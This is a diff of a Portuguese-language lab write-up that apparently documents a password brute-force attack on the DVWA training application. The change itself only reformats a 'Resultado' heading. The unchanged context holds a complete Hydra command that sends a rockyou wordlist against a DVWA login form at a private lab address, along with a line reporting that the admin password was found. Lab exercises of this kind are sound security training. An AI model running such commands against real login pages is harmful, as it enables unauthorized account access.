@@ -38,8 +38,7 @@ A solução foi limitar o número de tentativas simultâneas com o parâmetro `-
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 192.168.70.133 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
 
-### Resultado:
-
+ Resultado:
 O ataque foi executado com sucesso, descobrindo a senha correta para o usuário `admin`, como evidenciado na captura de tela abaixo.
 
 ![Resultado do Ataque com Hydra](images/Ataque_HIDRA.png)
